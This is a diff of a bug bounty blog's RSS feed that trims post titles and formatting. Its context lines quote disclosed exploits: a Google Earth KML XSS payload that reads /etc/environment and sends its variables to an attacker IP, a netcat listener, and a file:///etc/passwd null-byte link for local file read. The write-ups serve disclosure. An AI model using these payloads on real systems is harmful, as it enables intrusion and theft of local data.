@@ -28,7 +28,7 @@
 	<height>32</height>
 </image> 
 	<item>
-		<title>WRITE UP – finAPI (Open Banking API) oauth credentials exposed in plain text in Android app </title>
+		<title>finAPI (Open Banking API) oauth credentials exposed in plain text in Android app </title>
 		<link>/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/</link>
 					<comments>/write-up-finapi-open-banking-api-oauth-credentials-exposed-in-plain-text-in-android-app/#respond</comments>
 		
@@ -43,7 +43,7 @@
 
 
 
-<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -143,7 +143,7 @@ omespino@h0st:~# curl -H 'Authorization: Bearer IlR3byBy...lcmVuY2Ui' https://li
 		
 			</item>
 		<item>
-		<title>WRITE UP –  Android Application Screen Lock bypass via adb brute forcing</title>
+		<title>Android Application Screen Lock bypass via adb brute forcing</title>
 		<link>/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/</link>
 					<comments>/write-up-private-bug-bounty-bypass-redacted-android-application-screen-lock-via-local-brute-forcing/#comments</comments>
 		
@@ -158,7 +158,7 @@ omespino@h0st:~# curl -H 'Authorization: Bearer IlR3byBy...lcmVuY2Ui' https://li
 
 
 
-<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -260,7 +260,7 @@ echo "bypass successfully"</code></pre>
 		
 			</item>
 		<item>
-		<title>WRITE UP –  PRIVATE BUG BOUNTY: RCE in ec2 instance via ssh with private key exposed on public GitHub repository – $XX,000 USD</title>
+		<title>PRIVATE BUG BOUNTY: RCE in ec2 instance via ssh with private key exposed on public GitHub repository – $XX,000 USD</title>
 		<link>/write-up-private-bug-bounty-rce-in-ec2-instance-via-ssh-with-private-key-exposed-on-public-github-repository-xx000-usd/</link>
 					<comments>/write-up-private-bug-bounty-rce-in-ec2-instance-via-ssh-with-private-key-exposed-on-public-github-repository-xx000-usd/#respond</comments>
 		
@@ -275,7 +275,7 @@ echo "bypass successfully"</code></pre>
 
 
 
-<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -352,7 +352,7 @@ uid=0(root) gid=0(root) groups=0(root)</code></pre>
 		
 			</item>
 		<item>
-		<title>WRITE UP –  PRIVATE BUG BOUNTY: Firebase database exposed by misconfiguration – $2,000 USD</title>
+		<title>PRIVATE BUG BOUNTY: Firebase database exposed by misconfiguration</title>
 		<link>/write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-usd/</link>
 					<comments>/write-up-private-bug-bounty-firebase-database-exposed-by-misconfiguration-2000-usd/#respond</comments>
 		
@@ -367,7 +367,7 @@ uid=0(root) gid=0(root) groups=0(root)</code></pre>
 
 
 
-<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -573,7 +573,7 @@ omespino@h0st:~# grep -ir firebase | grep http
 		
 			</item>
 		<item>
-		<title>WRITE UP &#8211; XSS STORED IN FILES.SLACK.COM VIA XML/SVG FILE (IOS) &#8211;  $1,000 USD</title>
+		<title>XSS STORED IN FILES.SLACK.COM VIA XML/SVG FILE (IOS) &#8211;  $1,000 USD</title>
 		<link>/write-up-xss-stored-in-files-slack-com-via-xml-svg-file-ios-1000-usd/</link>
 					<comments>/write-up-xss-stored-in-files-slack-com-via-xml-svg-file-ios-1000-usd/#respond</comments>
 		
@@ -590,7 +590,7 @@ omespino@h0st:~# grep -ir firebase | grep http
 
 
 
-<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -685,7 +685,7 @@ Jun 5, 2019: Fixed by Slack team</b></p></p>
 		
 			</item>
 		<item>
-		<title>WRITE UP &#8211; APPLE N/A: PII information, full contact list, main phone no. and main iCloud email extracted; Bug patched: Arbitrary local file read via zip file and symlinks on iOS Files app.</title>
+		<title>APPLE N/A: PII information, full contact list, main phone no. and main iCloud email extracted; Bug patched: Arbitrary local file read via zip file and symlinks on iOS Files app.</title>
 		<link>/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/</link>
 					<comments>/write-up-apple-bug-bounty-n-a-arbitrary-local-file-read-via-zip-file-and-symlinks-usd/#respond</comments>
 		
@@ -704,7 +704,7 @@ Jun 5, 2019: Fixed by Slack team</b></p></p>
 
 
 
-<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -800,7 +800,7 @@ zip --symlinks -r symlinks.zip .
 		
 			</item>
 		<item>
-		<title>WRITE UP &#8211; GOOGLE VRP BUG BOUNTY: /etc/environment local variables exfiltrated on Linux Google Earth Pro desktop app &#8211; $1,337 USD</title>
+		<title>GOOGLE VRP BUG BOUNTY: /etc/environment local variables exfiltrated on Linux Google Earth Pro desktop app &#8211; $1,337 USD</title>
 		<link>/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/</link>
 					<comments>/write-up-google-vrp-bug-bounty-etc-environment-local-variables-exfiltrated-on-linux-google-earth-pro-desktop-app-1337-usd/#respond</comments>
 		
@@ -815,7 +815,7 @@ zip --symlinks -r symlinks.zip .
 
 
 
-<p class="has-text-align-center"><em>If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">If you like Bug Bounty writeups please check my  handbook <a rel="noreferrer noopener" href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -827,25 +827,25 @@ zip --symlinks -r symlinks.zip .
 
 
 
-<p><em>Summary: /etc/enviroment local variables disclosed on Linux Google Earth Pro desktop app<br></em><br><em>Steps to reproduce: </em></p>
+<p>Summary: /etc/enviroment local variables disclosed on Linux Google Earth Pro desktop app<br><br>Steps to reproduce: </p>
 
 
-<p><em>1.- Download and install the latest <a href="https://www.google.com/intl/en/earth/versions/#download-pro"> Google Earth Pro Desktop app for macOS (7.3.3.7786 64-bit / .deb)</a></em></p>
-<p><em>2.- Put your attacker server to listen in any port with netcat, in my case port 80:</em></p>
+<p>1.- Download and install the latest <a href="https://www.google.com/intl/en/earth/versions/#download-pro"> Google Earth Pro Desktop app for macOS (7.3.3.7786 64-bit / .deb)</a></p>
+<p>2.- Put your attacker server to listen in any port with netcat, in my case port 80:</p>
 <pre class="wp-block-code"><code> localh0st:~ user$ sudo nc -l -p 80</code></pre>
-<p><em>3.- Open the file attached <a href="https://drive.google.com/file/d/1yokdqGwWOQ3GJc7VQPruNjdOkrVUequx/view">etc_environment.kml</a> and modify the part where CDATA is and put your attacker server IP and save it. (extract of that file and actual XSS poc):</em></p>
+<p>3.- Open the file attached <a href="https://drive.google.com/file/d/1yokdqGwWOQ3GJc7VQPruNjdOkrVUequx/view">etc_environment.kml</a> and modify the part where CDATA is and put your attacker server IP and save it. (extract of that file and actual XSS poc):</p>
 <pre class="wp-block-code"><code>&lt;Placemark&gt;                                                                        &lt;name&gt;placemark&lt;/name&gt;&lt;description&gt;                                                                                  &lt;![CDATA[                                                                                           &lt;script src=file:../../../../../../../etc/environment&gt;&lt;/script&gt;                                                                                            &lt;script&gt;                                                                                    document.write('XSS fired :-)&lt;br&gt;');                                                                       document.write('Location: ' + location.href + '&lt;br&gt;');                                       document.write('&lt;br&gt;PATH var = ' + PATH);                                          document.write('&lt;br&gt;JAVA_HOME var = ' + JAVA_HOME);                                                                   document.write('&lt;img src=http://192.168.0.11/?path=' + PATH + '&amp;java_home=' + JAVA_HOME + '&gt;'); &lt;/script&gt;                                                                                               ]]&gt;&lt;/description&gt;
 </code></pre>
 
 
-<p><em>4.- Just open the <strong>etc_environment.kml</strong> file with a double click, once you see the red polygon click it to see the description and the XSS would be fire, it would contain variables from /etc/environment system file and send those to the attacker server</em></p>
+<p>4.- Just open the <strong>etc_environment.kml</strong> file with a double click, once you see the red polygon click it to see the description and the XSS would be fire, it would contain variables from /etc/environment system file and send those to the attacker server</p>
 
 
 <div class="wp-block-image">
 <figure class="aligncenter size-large"><a href="/wp-content/uploads/2021/11/etc_environment_ge_linux.jpg"><img class="wp-image-772" src="/wp-content/uploads/2021/11/etc_environment_ge_linux.jpg" alt=""></a></figure>
 </div>
-<p><em>5.- Profit</em></p>
-<p><em>Explanation, since we can inject random HTML/js code, we can &#8220;import&#8221; files with the script tag, per example &#8220;&lt;script src=file:///../../../../etc/enviroment&gt;&lt;/script&gt;&#8221;, so if the file has the right js format the browser would load any content, since the common format of /etc/environment is like:</em></p>
+<p>5.- Profit</p>
+<p>Explanation, since we can inject random HTML/js code, we can &#8220;import&#8221; files with the script tag, per example &#8220;&lt;script src=file:///../../../../etc/enviroment&gt;&lt;/script&gt;&#8221;, so if the file has the right js format the browser would load any content, since the common format of /etc/environment is like:</p>
 <pre class="wp-block-code"><code>PATH="/usr/local/sbin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin" <br>JAVA_HOME="/opt/jre/bin"
 </code></pre>
 <p>this would actually load because those variables have the same format that javascript variables ;-), plus since any linux environment vars are so predictable we can brute force the most common variables names and send them to the attacker server</p>
@@ -853,12 +853,12 @@ zip --symlinks -r symlinks.zip .
 <div class="wp-block-image">
 <figure class="aligncenter size-large"><a href="/wp-content/uploads/2021/11/etc_environment_DOM.png"><img class="wp-image-772" src="/wp-content/uploads/2021/11/etc_environment_DOM.png" alt=""></a></figure>
 </div>
-<p><em><b></b></em></p>
-<p><em><b></b></em></p>
-<p><em><b></b></em></p>
-<p><em><b></b></em></p>
-<p><em><b></b></em></p>
-<p><em>Attack scenario<br>Any attacker can read arbitrary variables from /etc/environment on Linux through the Google Earth Pro Desktop app via XSS<br></em></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p><b></b></p>
+<p>Attack scenario<br>Any attacker can read arbitrary variables from /etc/environment on Linux through the Google Earth Pro Desktop app via XSS<br></p>
 <div style="text-align: center !important;"><iframe loading="lazy" id="player" src="https://www.youtube.com/embed/ZMBbnALLRjU" width="1024" height="390" frameborder="0"></iframe></div>
 <p></p>
 <p><!-- /wp:paragraph --></p>
@@ -874,7 +874,7 @@ zip --symlinks -r symlinks.zip .
 		
 			</item>
 		<item>
-		<title>WRITE UP – ATLASSIAN BUG BOUNTY: XSS STORED IN API.MEDIA.ATLASSIAN.COM VIA DOC FILE (IOS)</title>
+		<title>ATLASSIAN BUG BOUNTY: XSS STORED IN API.MEDIA.ATLASSIAN.COM VIA DOC FILE (IOS)</title>
 		<link>/write-up-xss-stored-in-api-media-atlassian-com-via-doc-file-ios/</link>
 					<comments>/write-up-xss-stored-in-api-media-atlassian-com-via-doc-file-ios/#respond</comments>
 		
@@ -893,7 +893,7 @@ zip --symlinks -r symlinks.zip .
 
 
 
-<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -991,7 +991,7 @@ Mar 19, 2018: Fixed and rewarded</p>
 		
 			</item>
 		<item>
-		<title>WRITE UP &#8211; GOOGLE VRP N/A: Arbitrary local file read (macOS) via &#060;a&#062; tag and null byte (%00) in Google Earth Pro Desktop app</title>
+		<title>GOOGLE VRP N/A: Arbitrary local file read (macOS) via &#060;a&#062; tag and null byte (%00) in Google Earth Pro Desktop app</title>
 		<link>/write-up-google-vrp-n-a-arbitrary-local-file-read-macos-via-a-tag-and-null-byte-in-google-earth-pro-desktop-app/</link>
 					<comments>/write-up-google-vrp-n-a-arbitrary-local-file-read-macos-via-a-tag-and-null-byte-in-google-earth-pro-desktop-app/#respond</comments>
 		
@@ -1006,7 +1006,7 @@ Mar 19, 2018: Fixed and rewarded</p>
 
 
 
-<p class="has-text-align-center"><em>This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></em></p>
+<p class="has-text-align-center">This blogpost appeared first in the book <a href="/bug-bounty-writeups-collection/" data-type="URL" target="_blank" rel="noreferrer noopener">Bug Bounty Write Ups Collection</a><br></p>
 
 
 
@@ -1022,33 +1022,33 @@ Mar 19, 2018: Fixed and rewarded</p>
 
 
 
-<p><em>Summary: Arbitrary local file read (macOS) via &lt;a&gt; and null byte (%00) element in Google Earth Pro Desktop app <br></em><br><em>Steps to reproduce: </em></p>
+<p>Summary: Arbitrary local file read (macOS) via &lt;a&gt; and null byte (%00) element in Google Earth Pro Desktop app <br><br>Steps to reproduce: </p>
 
 
 
-<p><em>1.- Download and install the latest  <a href=https://www.google.com/intl/en/earth/versions/#download-pro> Google Earth Pro Desktop app for macOS (7.3.3.7786 64-bit)</a></em></p>
+<p>1.- Download and install the latest  <a href=https://www.google.com/intl/en/earth/versions/#download-pro> Google Earth Pro Desktop app for macOS (7.3.3.7786 64-bit)</a></p>
 
 
 
-<p><em>2.- Open the Google Earth app and create a new Pin, add any name add click on add link, and paste this code in the white box 
+<p>2.- Open the Google Earth app and create a new Pin, add any name add click on add link, and paste this code in the white box 
 
 <pre class="wp-block-code"><code>&lt;a href="file:///etc/passwd%00.html"&gt;passwd&lt;/a&gt; 
-</code></pre></em></p>
-<p><em>and click OK button</em></p>
+</code></pre></p>
+<p>and click OK button</p>
 
 
 
-<p><em>3.- After Pin&#8217;s creation, in the left side pane Places, click in the hyperlink called <span class="payload-highlight"><b>passwd</b></span> add see <span class="payload-highlight"><b>/etc/passwd</b></span> file content</em></p>
+<p>3.- After Pin&#8217;s creation, in the left side pane Places, click in the hyperlink called <span class="payload-highlight"><b>passwd</b></span> add see <span class="payload-highlight"><b>/etc/passwd</b></span> file content</p>
 
 
 <div class="wp-block-image">
 <figure class="aligncenter size-large"><a href="/wp-content/uploads/2021/04/ge-lfd-macos.jpg"><img src="/wp-content/uploads/2021/04/ge-lfd-macos.jpg" alt="" class="wp-image-772"></a></figure>
 </div>
-<p><em>4.- Profit</em></p>
-<p><em><b>PS. any attacker can read any file with file:/// schema and appending a null byte and dot HTML extension (%00.html)</b></em></p>
-<p><em>Attack scenario<br>
+<p>4.- Profit</p>
+<p><b>PS. any attacker can read any file with file:/// schema and appending a null byte and dot HTML extension (%00.html)</b></p>
+<p>Attack scenario<br>
 Any attacker can read arbitrary files on macOS through the Google Earth Pro Desktop app<br>
-</em></p>
+</p>
 <div style="text-align: center !important;">
 <iframe loading="lazy" id="player" type="text/html" width="1024" height="390" src="https://www.youtube.com/embed/HBk8DaRCCFE" frameborder="0"></iframe>
 </div>
